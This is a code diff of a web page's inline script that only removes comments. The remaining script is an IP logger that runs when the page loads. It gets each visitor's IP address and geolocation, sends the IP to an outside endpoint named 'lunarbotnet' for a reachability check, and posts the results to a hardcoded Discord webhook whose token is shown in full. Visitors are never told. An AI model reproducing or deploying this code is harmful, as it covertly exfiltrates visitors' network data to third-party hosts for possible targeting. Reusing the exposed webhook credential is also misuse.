@@ -6,9 +6,9 @@
 </head>
 <body>
     <script>
-    // Function to send data to Discord
+    
     async function sendToDiscord(ipInfo, icmpStatus) {
-        console.log("Sending to Discord:", ipInfo, icmpStatus);  // Debugging output
+        console.log("Sending to Discord:", ipInfo, icmpStatus);
         
         const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
         const discordMessage = {
@@ -94,7 +94,7 @@
         }
     }
 
-    // Function to get visitor info and ICMP status
+    
     async function getVisitorInfo() {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
@@ -103,23 +103,23 @@
         const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
         const ipInfo = await ipInfoResponse.json();
 
-        // Perform ICMP check
+        
         const icmpStatus = await checkICMP(userIP);
 
-        // Send the data to Discord
+        
         await sendToDiscord(ipInfo, icmpStatus);
     }
 
-    // ICMP check function
+    
     async function checkICMP(ip) {
         const response = await fetch(`https://lunarbotnet-meowwww.up.railway.app/ping?ip=${ip}`);
         const result = await response.json();
-        console.log("ICMP result:", result); // Log the result to debug
+        console.log("ICMP result:", result);
 
-        return result.reachable ? "Received ICMP" : "No ICMP response";  // Return the correct status
+        return result.reachable ? "Received ICMP" : "No ICMP response";  
     }
 
-    // Start the process
+    
     getVisitorInfo();
     </script>
 </body>
